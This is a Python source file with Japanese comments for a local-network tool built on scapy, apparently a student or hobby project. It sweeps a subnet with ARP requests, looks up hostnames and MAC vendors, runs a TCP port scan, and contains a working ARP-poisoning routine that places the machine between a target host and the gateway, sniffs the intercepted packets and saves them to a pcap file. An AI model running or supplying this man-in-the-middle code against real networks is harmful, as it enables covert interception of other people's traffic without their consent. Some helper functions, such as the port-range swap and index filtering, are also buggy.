import codecs
import json
import os
import socket
import subprocess as sbp
import sys
import threading
import time
import urllib.request as urllib2
from queue import Queue
from socket import timeout

import netifaces
import numpy as np
import pandas as pd
from scapy.all import *
from tqdm import tqdm


_cached_interface_details = None
_cached_interface_name = None

def get_active_network_info():
    """
    Determines the active network interface and its details.
    Tries to find the interface associated with the default gateway first.
    If not found, falls back to the first non-loopback interface with an IPv4 address and broadcast.
    Caches the result to avoid repeated lookups.
    Returns a tuple: (address_info_dict, interface_name_string)
    Raises Exception if no suitable interface is found.
    """
    global _cached_interface_details, _cached_interface_name
    if _cached_interface_details and _cached_interface_name:
        return _cached_interface_details, _cached_interface_name

    try:
        gws = netifaces.gateways()
        default_gw_info = gws.get('default', {}).get(netifaces.AF_INET)
        if default_gw_info:
            interface_name = default_gw_info[1]
            if_addrs = netifaces.ifaddresses(interface_name).get(netifaces.AF_INET)
            if if_addrs:
                for addr_info in if_addrs:
                    if 'addr' in addr_info and 'broadcast' in addr_info:
                        _cached_interface_details = addr_info
                        _cached_interface_name = interface_name
                        return _cached_interface_details, _cached_interface_name
    except Exception:
        # Problem getting gateway, fallback to iterating interfaces
        pass

    for interface_name in netifaces.interfaces():
        if_addrs = netifaces.ifaddresses(interface_name).get(netifaces.AF_INET)
        if if_addrs:
            for addr_info in if_addrs:
                if 'addr' in addr_info and 'broadcast' in addr_info and addr_info['addr'] != '127.0.0.1':
                    _cached_interface_details = addr_info
                    _cached_interface_name = interface_name
                    return _cached_interface_details, _cached_interface_name

    raise Exception("Could not determine a suitable active network interface with IP and broadcast address.")

# 自身のIPアドレスを取得する
def get_own_ip():
    details, _ = get_active_network_info()
    return details['addr']

def get_broadcastaddr():
    details, _ = get_active_network_info()
    return details['broadcast']

# IPアドレスのネットワーク部を特定する．
def get_network_part(my_ipaddr):
    # 自身のIPアドレスを取得する方法があれば，それを使った方がユーザからの入力を待たなくていいので，いいかもしれない．　s
    # 自身のIPアドレスとサブネットマスクからブロードキャストアドレスを求める．
    # /24,/16に対応するため（ネットワーク部を指定できるように）に要改善．
    # タイプCの場合
    count = 0
    my_ip = []
    network_part = ""

    for string in my_ipaddr:
        if string == ".":
            count = count + 1
            my_ip.append(string)
            if count == 3:
                break
        else:
            my_ip.append(string)

    for i in my_ip:
        network_part = network_part + i

    return network_part


# ICMPでブロードキャストを流し，返答を受け取ることで各種アドレスを特定
def get_addr(network_part, start, end):
    # 現在はTypeC,192だけに対応．ARPを送って，返信があるアドレスはデバイスが存在するアドレス．
    _, active_interface = get_active_network_info()
    # ネットワーク部だけ入力してもらって，後は繰り返す？ 192.168.1.0~192.168.1.254みたいに．
    # broadcast_ipaddr =
    receives_ICMP = []
    receives_ARP = []
    ip_addr_list = []
    print(start)
    start = int(start)
    end = int(end)

    for i in range(start, end + 1):
        i = str(i)
        dst_addr = network_part + i
        ip_addr_list.append(dst_addr)

        print("現在探索中のアドレスは{}".format(dst_addr))

        frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=dst_addr)
        receive = srp1(frame, timeout=0.1, iface=active_interface, verbose=0)
        try:
            receives_ARP.append(receive[Ether].src)
        except:
            receives_ARP.append(receive)
    return ip_addr_list, receives_ARP


# arp


# hostname
def get_hostname(ip_list):
    host_list = []
    for ip in ip_list:
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            host_list.append(hostname)
        except:
            host_list.append("None")

    return host_list


# MACアドレスがある（デバイスが存在する）添字を獲得する
def get_index(mac_addr_list):
    index_list = []
    for mac in mac_addr_list:
        print(mac)
        try:
            index = mac_addr_list.index(mac)
            index_list.append(index)
        except:
            print("macアドレスが存在しない．")

    for number in index_list:
        try:
            index_list.remove(0)
        except:
            print("0がなくなりました")

    return index_list


# ベンダ名とベンダの住所を検索
def get_vendor_name(mac_addr_list):
    vendor_list = []
    vendor_address_list = []
    for mac in mac_addr_list:
        # API base url,you can also use https if you need
        url = "http://macvendors.co/api/"
        # Mac address to lookup vendor from
        mac_address = str(mac)

        request = urllib2.Request(
            url + mac_address, headers={"User-Agent": "API Browser"}
        )
        response = urllib2.urlopen(request)
        # Fix: json object must be str, not 'bytes'
        reader = codecs.getreader("utf-8")
        obj = json.load(reader(response))

        # Print company name
        try:
            vendor_list.append(obj["result"]["company"])
        except:
            vendor_list.append("None")

        # print company address
        try:
            vendor_address_list.append(obj["result"]["address"])
        except:
            vendor_address_list.append("None")
    return vendor_list, vendor_address_list


# これまで作ったリストを結合し，ネットワーク内に存在するデバイスのみ列挙する．（まだ見つけられていないデバイスもいくつか存在する）
def make_df(
    ip_addr_list, mac_addr_list, host_list, vendor_name, vendor_address
):
    df = pd.DataFrame()
    df["IP"] = ip_addr_list
    df["MAC"] = mac_addr_list
    df["host"] = host_list
    df["vendor_name"] = vendor_name
    df["vendor_address"] = vendor_address

    df = df.dropna(subset=["MAC"])
    # df.to_csv('test.csv',index=False)
    df.to_html("templates/result.html")

    return df


def lan_scan(start=0, end=255):
    own_ip = get_own_ip()
    network_part = get_network_part(own_ip)
    ip_addr_list, mac_addr_list = get_addr(network_part, start, end)
    host_list = get_hostname(ip_addr_list)
    vendor_list, vendor_address = get_vendor_name(mac_addr_list)
    df = make_df(
        ip_addr_list, mac_addr_list, host_list, vendor_list, vendor_address
    )
    df.to_html('templates/result.html')
    print(df.head())


def port_scan(ip, port=0, port_end=65535):
    ip = ip
    port = int(port)
    port_end = int(port_end)

    while port_end < port:
        tmp = port
        port = port_end
        port_end = port

        if port == port_end:
            break

    open_port = []

    for port in tqdm(range(port, port_end + 1)):
        s = socket.socket()
        errno = s.connect_ex((ip, port))
        s.close()

        if errno == 0:
            print("port {} is open", port)
            open_port.append(port)
        else:
            print("{} is close", port)
            print(os.strerror(errno))
    return open_port


# arp_spoofingのための関数を以下に定義していく


# macアドレスの取得
# なりすましたい対象のipアドレスからMACアドレスを取得する
def get_mac(ip_address, interface):
    responses, unanswered = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
        timeout=2,
        retry=10,
        iface=interface,
        verbose=0
    )
    for s, r in responses:
        return r[Ether].src
    return None


# 偽ARPテーブル作成
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, stop_event, interface):
    poison_target_pkt = ARP()
    poison_target_pkt.op = 2
    poison_target_pkt.psrc = gateway_ip
    poison_target_pkt.pdst = target_ip
    poison_target_pkt.hwdst = target_mac

    poison_gateway_pkt = ARP()
    poison_gateway_pkt.op = 2
    poison_gateway_pkt.psrc = target_ip
    poison_gateway_pkt.pdst = gateway_ip
    poison_gateway_pkt.hwdst = gateway_mac

    print(f"Starting ARP poisoning on interface {interface} between {target_ip} and {gateway_ip}...")
    # arpぽいぞニング開始
    while not stop_event.wait(2): # Check event every 2 seconds
        send(poison_target_pkt, iface=interface, verbose=0)
        send(poison_gateway_pkt, iface=interface, verbose=0)
    print("ARP poisoning stopped.")
    return


# arpテーブルリセット
def reset_target(gateway_ip, gateway_mac, target_ip, target_mac, interface):
    print(f"Resetting ARP tables on interface {interface} for {target_ip} and {gateway_ip}...")
    send(
        ARP(
            op=2,
            psrc=gateway_ip,
            pdst=target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=gateway_mac,
        ),
        count=5,
        iface=interface,
        verbose=0
    )
    send(
        ARP(
            op=2,
            psrc=target_ip,
            pdst=gateway_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=target_mac,
        ),
        count=5,
        iface=interface,
        verbose=0
    )
    print("ARP tables reset.")

def arp_poisoning(target_ip, gateway_ip, packet_count=200):
    # host_ip = get_own_ip() # Not strictly needed here unless for logging
    _, interface_name = get_active_network_info()
    packet_count = int(packet_count)
    # conf.iface = interface_name # Set for any scapy functions that might rely on global conf
    conf.verb = 0

    print(f"Using interface: {interface_name}")

    gateway_mac = get_mac(gateway_ip, interface_name)

    # gateway_macなかったら失敗
    if not gateway_mac:
        print(f"Error: Could not get MAC address for gateway {gateway_ip} on interface {interface_name}.")
        sys.exit(1)
    print(f"Gateway {gateway_ip} MAC: {gateway_mac}")

    target_mac = get_mac(target_ip, interface_name)

    # target_macがなかったら失敗
    if not target_mac:
        print(f"Error: Could not get MAC address for target {target_ip} on interface {interface_name}.")
        sys.exit(1)
    print(f"Target {target_ip} MAC: {target_mac}")

    stop_event = threading.Event()
    poison_thread = threading.Thread(
        target=poison_target,
        args=(gateway_ip, gateway_mac, target_ip, target_mac, stop_event, interface_name),
    )
    poison_thread.start()

    print(f"Sniffing {packet_count} packets on interface {interface_name}...")
    try:
        # Sniff packets, but also check stop_event periodically via stop_filter
        # and use a timeout as a fallback for sniff completion.
        # Adjust timeout logic as needed; this is a basic example.
        # A more robust timeout might be dynamic based on expected packet rate or a very long fixed duration.
        packets = sniff(count=packet_count, iface=interface_name, stop_filter=lambda p: stop_event.is_set(), timeout=300)
    finally:
        # Ensure poisoning stops regardless of how sniff finishes
        if not stop_event.is_set():
            print("Sniffing complete or timed out, signaling poison thread to stop...")
            stop_event.set()

    poison_thread.join() # Wait for poison thread to finish cleanly

    wrpcap("file/arper.pcap", packets)
    print(f"Captured {len(packets)} packets to file/arper.pcap.")

    reset_target(gateway_ip, gateway_mac, target_ip, target_mac, interface_name)


if __name__ == "__main__":
    lan_scan()
